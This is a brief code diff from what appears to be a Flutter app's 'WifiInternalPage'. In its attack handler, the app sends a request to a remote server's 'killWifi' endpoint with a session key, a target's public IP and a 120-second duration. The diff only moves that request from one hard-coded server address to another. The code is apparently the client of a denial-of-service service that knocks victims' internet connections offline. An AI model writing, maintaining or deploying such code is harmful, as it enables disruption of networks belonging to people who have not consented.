@@ -117,7 +117,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> with TickerProvider
     HapticFeedback.heavyImpact();
     setState(() => isAttacking = true);
     final url = Uri.parse(
-        "http://139.59.228.145:4000/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
+        "http://157.245.159.165:4001/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
     try {
       final res = await http.get(url);
       if (res.statusCode == 200) {
